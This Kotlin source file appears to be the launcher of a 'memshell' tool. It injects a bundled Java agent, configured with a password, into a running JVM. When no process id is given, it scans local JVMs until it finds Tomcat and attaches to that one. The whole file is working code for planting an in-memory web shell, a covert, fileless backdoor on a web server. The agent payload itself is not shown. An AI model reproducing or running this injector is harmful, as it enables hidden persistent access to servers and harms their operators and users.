package com.xhstormr.app

import com.sun.tools.attach.VirtualMachine
import net.bytebuddy.agent.ByteBuddyAgent
import java.io.FileNotFoundException
import java.util.concurrent.TimeUnit
import kotlin.io.path.createTempFile

fun main(args: Array<String>) {
    if (args.size != 2) {
        println("Usage: memshell <pid> <pass>")
        return
    }

    val pid = args[0].toLong()
    val pass = args[1]
    val bootJar = getCurrentJar().absolutePath
    val agentJar = createTempFile().toFile()
    val agentArgs = renderOptions(mapOf("pass" to pass, "bootJar" to bootJar))

    val bytes = getSystemResourceAsStream("agent-1.0-SNAPSHOT.jar")?.readBytes()
        ?: throw FileNotFoundException("agent-1.0-SNAPSHOT.jar")
    agentJar.writeBytes(bytes)

    if (pid != 0L) {
        ByteBuddyAgent.attach(agentJar, pid.toString(), agentArgs)
    } else {
        while (true) {
            println("Scanning...")
            VirtualMachine.list().forEach {
                runCatching {
                    val vm = VirtualMachine.attach(it)
                    val isTomcat = try {
                        vm.systemProperties.containsKey("catalina.base")
                    } catch (e: Exception) {
                        false
                    } finally {
                        vm.detach()
                    }

                    if (isTomcat) {
                        println(it)
                        TimeUnit.SECONDS.sleep(30)
                        ByteBuddyAgent.attach(agentJar, it.id(), agentArgs)
                        return
                    }
                }
            }
            TimeUnit.SECONDS.sleep(60)
        }
    }
}
